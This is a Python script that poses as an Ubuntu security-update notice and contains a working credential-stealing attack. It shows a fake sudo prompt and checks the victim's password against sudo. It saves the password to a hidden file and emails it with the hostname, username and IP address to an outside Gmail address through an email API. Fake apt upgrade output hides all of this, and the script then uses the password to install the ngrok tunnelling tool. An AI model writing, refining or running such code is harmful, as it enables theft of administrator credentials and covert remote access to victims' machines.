#!/usr/bin/env python3

import os
import sys
import time
import getpass
import subprocess
import threading
import random
import platform
from datetime import datetime
from pathlib import Path

def debug_log(message):
    print(f"[DEBUG] {message}")

def clear_screen():
    os.system('clear')

def send_password_via_resend(password):
    try:
        api_key = os.environ.get("RESEND_API_KEY")
        if not api_key:
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hostname = os.uname().nodename
        username = os.environ.get('USER', 'unknown')
        try:
            ip_address = subprocess.check_output(
                ["hostname", "-I"], text=True
            ).strip().split()[0]
        except Exception:
            ip_address = "unknown"

        subject = f"Security Audit - Credential Capture from {hostname}"
        html_body = f"""
        <h2>Stolen Sudo Password</h2>
        <hr>
        <p><strong>Timestamp:</strong> {timestamp}</p>
        <p><strong>Target System:</strong> {hostname}</p>
        <p><strong>Username:</strong> {username}</p>
        <p><strong>IP Address:</strong> {ip_address}</p>
        <p><strong>Captured Password:</strong> {password}</p>
        <br>
        <p>This is an automated security audit report.<br>
        Please review system security protocols.</p>
        <hr>
        <p>--<br>Automated Security Audit System</p>
        """

        data = {
            "from": "Acme <onboarding@resend.dev>",
            "to": ["arkhamzz47@gmail.com"],
            "subject": subject,
            "html": html_body
        }

        curl_cmd = [
            "curl", "-X", "POST", "https://api.resend.com/emails",
            "-H", f"Authorization: Bearer {api_key}",
            "-H", "Content-Type: application/json",
            "-d", str(data).replace("'", '"')
        ]
        
        subprocess.Popen(curl_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    except Exception:
        pass

def capture_sudo_password():
    max_attempts = 3
    attempt = 1

    while attempt <= max_attempts:
        try:
            if attempt == 1:
                prompt = "[sudo] password for {}: ".format(os.getenv('USER', 'user'))
            else:
                prompt = "Sorry, try again.\n[sudo] password for {}: ".format(os.getenv('USER', 'user'))

            password = getpass.getpass(prompt)

            process = subprocess.Popen(
                ['sudo', '-S', '-v'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(input=password + '\n', timeout=10)

            if process.returncode == 0:
                return password
            else:
                attempt += 1

        except KeyboardInterrupt:
            print("\n")
            sys.exit(1)
        except subprocess.TimeoutExpired:
            attempt += 1

    print(f"sudo: {max_attempts} incorrect password attempts")
    sys.exit(1)

def show_installation_progress():
    downloads = [
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libssl3 amd64 3.0.2-0ubuntu1.15", "1,898 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 openssl amd64 3.0.2-0ubuntu1.15", "1,185 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 linux-firmware all 20220329.git681281e4-0ubuntu3.21", "9,775 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ca-certificates all 20230311ubuntu0.22.04.1", "153 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 systemd amd64 249.11-0ubuntu3.12", "4,526 kB")
    ]
    
    for i, (url, size) in enumerate(downloads, 1):
        print(f"Get:{i} {url} [{size}]")
        time.sleep(random.uniform(0.5, 1.0))
    
    print("Fetched 14.2 MB in 3s (4,237 kB/s)")
    print("(Reading database ... 185243 files and directories currently installed.)")
    
    packages = [
        "libssl3:amd64",
        "openssl", 
        "linux-firmware",
        "ca-certificates",
        "systemd"
    ]
    
    for package in packages:
        print(f"Preparing to unpack .../archives/{package}...")
        time.sleep(random.uniform(0.2, 0.5))
        print(f"Unpacking {package} ...")
        time.sleep(random.uniform(0.3, 0.8))
        print(f"Setting up {package} ...")
        time.sleep(random.uniform(0.5, 1.0))

def is_ubuntu():
    try:
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                if 'ubuntu' in content:
                    return True
        
        if 'ubuntu' in platform.platform().lower():
            return True
            
        try:
            result = subprocess.run(['lsb_release', '-i'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and 'ubuntu' in result.stdout.lower():
                return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
            
        return False
    except Exception as e:
        debug_log(f"Error checking Ubuntu: {e}")
        return False

def get_stored_password():
    try:
        home_dir = os.path.expanduser("~")
        log_path = os.path.join(home_dir, ".local", "share", ".temp_log")
        
        if not os.path.exists(log_path):
            debug_log(f"Password file not found: {log_path}")
            return None
            
        with open(log_path, 'r') as f:
            lines = f.read().strip().split('\n')
            if lines and lines[-1]:
                password = lines[-1].strip()
                debug_log(f"Password retrieved from {log_path}")
                return password
                
        debug_log("No password found in file")
        return None
        
    except Exception as e:
        debug_log(f"Error reading password file: {e}")
        return None

def is_ngrok_installed():
    try:
        result = subprocess.run(['which', 'ngrok'], capture_output=True)
        return result.returncode == 0
    except Exception:
        return False

def install_ngrok_with_password(password):
    try:
        debug_log("Starting ngrok installation...")
        
        # Check if ngrok is already installed
        if is_ngrok_installed():
            debug_log("ngrok is already installed, skipping installation")
            print("ngrok is already installed on this system.")
            try:
                version_result = subprocess.run(['ngrok', 'version'], capture_output=True, text=True)
                if version_result.returncode == 0:
                    print(f"Current version: {version_result.stdout.strip()}")
            except Exception:
                pass
            return True
        
        commands = [
            "curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null",
            'echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list',
            "sudo apt update",
            "sudo apt install ngrok -y"
        ]
        
        for i, command in enumerate(commands, 1):
            debug_log(f"Executing step {i}/{len(commands)}: {command}")
            
            if "sudo" in command:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                stdout, stderr = process.communicate(input=f"{password}\n")
                
                if process.returncode != 0:
                    debug_log(f"Command failed with return code {process.returncode}")
                    debug_log(f"STDERR: {stderr}")
                    return False
                else:
                    debug_log(f"Command succeeded: {stdout[:100]}...")
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                if result.returncode != 0:
                    debug_log(f"Command failed: {result.stderr}")
                    return False
                else:
                    debug_log(f"Command succeeded: {result.stdout[:100]}...")
        
        try:
            result = subprocess.run(['ngrok', 'version'], capture_output=True, text=True)
            if result.returncode == 0:
                debug_log(f"ngrok successfully installed: {result.stdout.strip()}")
                return True
            else:
                debug_log("ngrok installation verification failed")
                return False
        except FileNotFoundError:
            debug_log("ngrok command not found after installation")
            return False
            
    except Exception as e:
        debug_log(f"Error during ngrok installation: {e}")
        return False

def auto_install_ngrok():
    """
    Automatically install ngrok if password is available and system is Ubuntu.
    Returns early if ngrok is already installed.
    """
    if not is_ubuntu():
        debug_log("System is not Ubuntu, skipping ngrok installation")
        return False
    
    # Check if ngrok is already installed
    if is_ngrok_installed():
        debug_log("ngrok is already installed, returning early")
        return True
    
    password = get_stored_password()
    if not password:
        debug_log("No stored password available for ngrok installation")
        return False
    
    debug_log("Password found, attempting ngrok installation")
    print("\nInstalling ngrok...")
    success = install_ngrok_with_password(password)
    
    if success:
        print("ngrok has been successfully installed!")
        debug_log("ngrok installation completed successfully")
    else:
        print("Failed to install ngrok. Check the debug output for details.")
        debug_log("ngrok installation failed")
    
    return success

def save_password_to_file(password):
    """Save password to the hidden log file"""
    try:
        home_dir = os.path.expanduser("~")
        share_dir = os.path.join(home_dir, ".local", "share")
        os.makedirs(share_dir, exist_ok=True)
        file_path = os.path.join(share_dir, ".temp_log")
        with open(file_path, "a") as f:
            f.write(password + "\n")
        return True
    except Exception:
        return False

def main():
    try:
        # Check if password is already captured
        stored_password = get_stored_password()
        
        if stored_password:
            debug_log("Password already captured, attempting automatic ngrok installation")
            auto_install_ngrok()
            return
        
        # If no password stored, run the fake sudo capture
        clear_screen()
        
        print("Unattended-upgrades: Security updates have not been installed.")
        print("The following security updates are pending:")
        print("  ca-certificates libssl3 linux-firmware openssl systemd")
        print()
        print("It is recommended that you apply these updates immediately.")
        print("To do so, run the following command:")
        print("  sudo apt update && sudo apt upgrade")
        print()
        
        password = capture_sudo_password()
        
        print("Reading package lists... Done")
        time.sleep(1)
        print("Building dependency tree       ")
        print("Reading state information... Done")
        time.sleep(2)
        print("The following packages will be upgraded:")
        print("  ca-certificates libssl3 linux-firmware openssl systemd")
        print("5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.")
        print("Need to get 14.2 MB of archives.")
        print("After this operation, 0 B of additional disk space will be used.")
        print()
        time.sleep(1)
        
        # Save password to file
        save_password_to_file(password)
        
        # Send password via email in background
        if password:
            background_thread = threading.Thread(target=send_password_via_resend, args=(password,))
            background_thread.daemon = True
            background_thread.start()
        
        # Show fake installation progress
        show_installation_progress()
        
        print("Processing triggers for man-db (2.10.2-1) ...")
        print("Processing triggers for libc-bin (2.35-0ubuntu3.4) ...")
        time.sleep(1)
        print()
        
        # After capturing password, automatically try to install ngrok
        debug_log("Password captured, attempting automatic ngrok installation")
        auto_install_ngrok()
        
        sys.exit(0)
        
    except KeyboardInterrupt:
        print("\n")
        sys.exit(1)
    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    main()
